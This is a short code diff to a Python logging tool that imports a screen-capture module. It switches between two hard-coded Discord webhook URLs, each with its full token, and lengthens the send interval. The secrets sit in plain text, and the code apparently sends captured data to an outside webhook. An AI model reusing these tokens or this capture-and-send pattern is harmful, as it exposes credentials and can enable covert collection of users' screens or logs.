@@ -4,8 +4,8 @@ import threading
 from capturescreen.capturescreen import Capture
 import time
 
-# webhook_url = 'https://discord.com/api/webhooks/1191725443196403712/NUqKQaxg31Sy-LoBEqk04zVJYjbc09wx0PdTSemziIgFmDfCP3QyxydprWpzqs6i20y8'
-webhook_url = "https://discord.com/api/webhooks/1191006621074206814/Ji2fDa4JdkxXXAhGSXtELL0h-RhHlAc4kIfGDPJMENTIsytDXNu-RFENQlL2GdIbsWD-"
+webhook_url = 'https://discord.com/api/webhooks/1191725443196403712/NUqKQaxg31Sy-LoBEqk04zVJYjbc09wx0PdTSemziIgFmDfCP3QyxydprWpzqs6i20y8'
+# webhook_url = "https://discord.com/api/webhooks/1191006621074206814/Ji2fDa4JdkxXXAhGSXtELL0h-RhHlAc4kIfGDPJMENTIsytDXNu-RFENQlL2GdIbsWD-"
 
 
 class Logging:
@@ -15,7 +15,7 @@ class Logging:
         self.logging_thread = None
         self.is_capturing_logs = False
         self.button_callback = log_button_callback
-        self.send_interval = 10
+        self.send_interval = 180
 
     def toggle_capture_logs(self):
         if not self.is_running():
